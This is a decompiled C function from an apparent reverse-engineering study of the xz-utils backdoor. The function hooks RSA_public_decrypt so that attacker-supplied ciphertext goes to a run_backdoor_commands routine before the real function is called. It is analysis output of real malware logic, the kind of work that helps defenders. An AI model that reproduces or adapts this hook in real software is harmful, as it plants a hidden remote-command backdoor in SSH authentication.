// /home/kali/xzre-ghidra/xzregh/10A240_hook_RSA_public_decrypt.c
// Function: hook_RSA_public_decrypt @ 0x10A240
// Calling convention: unknown
// Prototype: undefined hook_RSA_public_decrypt(void)


/*
 * AutoDoc: Replaces `RSA_public_decrypt` with a wrapper that feeds the RSA handle and ciphertext into `run_backdoor_commands` before deciding whether to call the real function. Once the audit symbind hook is active, this is the primary trigger that lets attacker payloads run.
 */
#include "xzre_types.h"


undefined8
hook_RSA_public_decrypt
          (undefined4 param_1,undefined8 param_2,undefined8 param_3,long param_4,ulong param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  undefined8 uVar1;
  int result;
  
  if (((global_ctx != 0) && (*(undefined8 **)(global_ctx + 8) != (undefined8 *)0x0)) &&
     (UNRECOVERED_JUMPTABLE = (code *)**(undefined8 **)(global_ctx + 8),
     UNRECOVERED_JUMPTABLE != (code *)0x0)) {
    if (param_4 != 0) {
      result = 1;
      uVar1 = run_backdoor_commands(param_4,global_ctx,&result);
      param_5 = param_5 & 0xffffffff;
      if (result == 0) {
        return uVar1;
      }
    }
                    /* WARNING: Could not recover jumptable at 0x0010a2bd. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    uVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4,param_5);
    return uVar1;
  }
  return 0;
}

